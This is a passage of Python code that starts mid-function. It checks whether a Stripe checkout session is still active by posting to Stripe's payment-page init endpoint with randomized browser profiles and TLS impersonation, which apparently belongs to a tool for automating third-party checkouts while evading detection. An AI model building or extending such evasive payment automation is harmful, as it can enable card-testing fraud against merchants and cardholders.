            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
            return result

    return result


async def check_checkout_active(pk: str, cs: str) -> bool:
    """Check if a checkout session is still active."""
    try:
        bp = get_random_browser_profile()
        eid = generate_eid()
        body = f"key={pk}&eid={eid}&browser_locale=en-US&redirect_type=url"
        async with CurlSession(impersonate=bp['tls']) as s:
            r = await s.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/init",
                headers=get_stripe_headers(),
                data=body,
                timeout=5
            )
            data = r.json()
            return "error" not in data
    except Exception as e:
        print(f"[DEBUG] check_checkout_active error: {str(e)[:40]}")
        return False
